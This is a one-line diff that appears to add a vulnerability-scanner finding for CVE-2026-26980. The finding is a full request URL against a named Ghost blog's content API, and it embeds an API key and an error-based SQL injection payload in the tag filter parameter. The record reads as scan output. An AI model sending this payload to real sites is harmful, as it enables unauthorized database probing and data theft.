@@ -1,0 +1,1 @@
+[CVE-2026-26980] [http] [critical] https://blog.saner.ai/ghost/api/content/tags/?key=2d8e7b9323e902cd9e518a018d&filter=slug:['||CASE+WHEN+1=0+THEN+0+ELSE+EXP(710)+END||',hash-import-2025-06-13-04-23]
